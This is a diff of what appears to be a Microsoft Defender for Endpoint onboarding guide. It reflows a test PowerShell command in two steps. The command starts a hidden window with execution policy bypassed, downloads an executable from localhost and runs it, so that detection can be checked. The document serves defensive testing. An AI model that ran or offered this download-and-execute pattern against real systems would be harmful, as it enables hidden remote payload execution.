@@ -69,11 +69,7 @@ generated](./media/image8.png)
     **Enter** button.
     
 ```
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden
-$ErrorActionPreference= 'silentlycontinue';(New-Object
-System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe',
-'C:test-WDATP-testinvoice.exe');Start-Process
-'C:test-WDATP-testinvoice.exe'
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:test-WDATP-testinvoice.exe');Start-Process'C:test-WDATP-testinvoice.exe'
 ```
 
 11. The Command Prompt window closes automatically. Wait for 5-10
@@ -159,11 +155,7 @@ generated](./media/image21.png)
     **Enter** button.
 
 ```
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden
-$ErrorActionPreference= 'silentlycontinue';(New-Object
-System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe',
-'C:test-WDATP-testinvoice.exe');Start-Process
-'C:test-WDATP-testinvoice.exe'
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:test-WDATP-testinvoice.exe');Start-Process'C:test-WDATP-testinvoice.exe'
 ```
 
 13. The Command Prompt window closes automatically. Wait for 5-10
